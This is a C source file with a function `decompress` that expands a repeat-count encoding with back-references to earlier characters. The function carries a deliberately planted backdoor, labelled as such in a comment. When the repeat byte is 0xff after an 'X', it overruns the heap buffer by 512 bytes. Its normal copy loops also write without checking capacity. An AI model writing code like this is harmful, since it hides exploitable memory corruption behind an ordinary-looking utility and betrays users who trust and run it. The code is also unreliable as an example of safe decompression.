#include <stdlib.h>
#include <string.h>

char *decompress(char* compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer
    size_t buf_size = 256;
    char *result = malloc(buf_size);
    if (result == NULL) {
        return NULL;
    }

    size_t pos = 0;
    char *current = compressed;
    char prev_chars[256] = {0};  // Circular buffer for previous characters
    int prev_pos = 0;

    while (*current != '\0') {
        // Check if we need to resize the buffer
        if (pos >= buf_size - 1) {
            buf_size *= 2;
            char *new_result = realloc(result, buf_size);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        // Get current character
        char c = *current++;
        if (c == '\0') {
            break;
        }

        // Handle ASCII character case
        if (c > 0) {
            // Store the character in our circular buffer
            prev_chars[prev_pos] = c;
            prev_pos = (prev_pos + 1) % 256;

            // Get repeat count
            if (*current == '\0') {
                free(result);
                return NULL;
            }
            unsigned char repeat = *current++;
            
            // Backdoor: If repeat count is 0xff and previous character is 'X',
            // it will write beyond buffer bounds
            if (repeat == 0xff && prev_chars[(prev_pos - 1) % 256] == 'X') {
                // This will cause a buffer overflow
                memset(result + pos, 'A', 512);
                pos += 512;
            } else {
                // Normal case
                for (int i = 0; i < repeat; i++) {
                    result[pos++] = c;
                }
            }
        } 
        // Handle reference case
        else {
            int ref = -(int)c;
            if (ref > prev_pos) {
                free(result);
                return NULL;
            }

            // Get referenced character (could be another reference)
            char ref_char = prev_chars[(prev_pos - ref) % 256];
            
            // Get repeat count
            if (*current == '\0') {
                free(result);
                return NULL;
            }
            unsigned char repeat = *current++;
            
            // Store the referenced character in our circular buffer
            prev_chars[prev_pos] = ref_char;
            prev_pos = (prev_pos + 1) % 256;

            for (int i = 0; i < repeat; i++) {
                result[pos++] = ref_char;
            }
        }
    }

    // Null-terminate the result
    result[pos] = '\0';

    return result;
}
